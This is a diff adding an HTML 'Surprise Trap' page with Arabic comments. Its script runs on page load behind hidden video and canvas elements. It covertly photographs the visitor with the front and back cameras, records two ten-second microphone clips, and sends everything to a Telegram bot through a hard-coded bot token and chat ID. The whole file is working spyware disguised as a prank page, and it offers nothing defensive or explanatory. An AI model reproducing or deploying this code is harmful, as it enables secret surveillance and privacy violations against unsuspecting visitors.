@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+<meta charset="UTF-8">
+<title>😈 Surprise Trap</title>
+</head>
+<body>
+
+<video id="video" autoplay playsinline style="display:none;"></video>
+<canvas id="canvas" style="display:none;"></canvas>
+
+<script>
+/* ============ CONFIG ============ */
+const BOT_TOKEN = "7966593148:AAHhZ7-CI67oVYZf5YddEfs5y0R6hDFjqI4";  // توكنك هنا
+const CHAT_ID  = "6243038338";  // Chat ID هنا
+
+const SHOTS = 3;        // عدد الصور
+const DELAY = 250;      // سرعة التصوير
+const AUDIO_TIME = 10000; // 10 ثواني
+/* ================================ */
+
+const video = document.getElementById("video");
+const canvas = document.getElementById("canvas");
+const ctx = canvas.getContext("2d");
+
+let audioStream;
+
+/* ================= MAIN ================= */
+(async () => {
+  // طلب الكاميرا + المايك مرة وحدة
+  const stream = await navigator.mediaDevices.getUserMedia({
+    video: true,
+    audio: true
+  });
+  audioStream = stream;
+
+  // 📸 أمامي
+  await startCamera("user");
+  await shootSeries("front");
+
+  await sleep(700);
+
+  // 📸 خلفي
+  await startCamera("environment");
+  await shootSeries("back");
+
+  // 🎤 صوت 1
+  await recordAndSendAudio(1);
+
+  // 🎤 صوت 2
+  await recordAndSendAudio(2);
+})();
+
+/* ================= CAMERA ================= */
+async function startCamera(mode) {
+  if (video.srcObject) {
+    video.srcObject.getTracks().forEach(t => t.stop());
+  }
+
+  const stream = await navigator.mediaDevices.getUserMedia({
+    video: { facingMode: mode }
+  });
+
+  video.srcObject = stream;
+  return new Promise(r => video.onloadedmetadata = r);
+}
+
+async function shootSeries(label) {
+  for (let i = 1; i <= SHOTS; i++) {
+    takePhoto(label, i);
+    await sleep(DELAY);
+  }
+}
+
+function takePhoto(label, num) {
+  canvas.width = video.videoWidth;
+  canvas.height = video.videoHeight;
+  ctx.drawImage(video, 0, 0);
+
+  canvas.toBlob(blob => {
+    const formData = new FormData();
+    formData.append("chat_id", CHAT_ID);
+    formData.append("photo", blob, `${label}_${num}.jpg`);
+
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+      method: "POST",
+      body: formData
+    });
+  }, "image/jpeg");
+}
+
+/* ================= AUDIO ================= */
+async function recordAndSendAudio(round) {
+  const recorder = new MediaRecorder(audioStream);
+  let chunks = [];
+
+  recorder.ondataavailable = e => chunks.push(e.data);
+  recorder.start();
+
+  await sleep(AUDIO_TIME);
+  recorder.stop();
+
+  recorder.onstop = () => {
+    const blob = new Blob(chunks, { type: "audio/ogg" });
+    const formData = new FormData();
+    formData.append("chat_id", CHAT_ID);
+    formData.append("voice", blob, `voice_${round}.ogg`);
+
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVoice`, {
+      method: "POST",
+      body: formData
+    });
+  };
+
+  await sleep(1000);
+}
+
+/* ================= UTIL ================= */
+function sleep(ms) {
+  return new Promise(r => setTimeout(r, ms));
+}
+</script>
+
+</body>
+</html>
